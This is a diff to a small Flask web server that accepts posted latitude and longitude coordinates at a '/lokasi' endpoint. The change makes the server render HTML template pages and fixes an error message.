@@ -1,10 +1,10 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from datetime import datetime
 from flask_cors import CORS  
+import os
 
-app = Flask(__name__)
-
-CORS(app)  
+app = Flask(__name__, template_folder='templates')
+CORS(app)
 
 @app.route('/lokasi', methods=['POST'])
 def terima_lokasi():
@@ -19,13 +19,15 @@ def terima_lokasi():
         print(f"Location Captured: {latitude}, {longitude}")
         return jsonify({"status": "success", "message": "Location Captured"}), 200
     else:
-        return jsonify({"status": "failed", "message": "Location Can't be Reached e"}), 400
+        return jsonify({"status": "failed", "message": "Location Can't be Reached"}), 400
 
 @app.route('/')
 def index():
-    return "Server Activated"
+    return render_template("index.html")
 
-import os
+@app.route('/hello')
+def hello():
+    return render_template("hello.html")
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 8080))
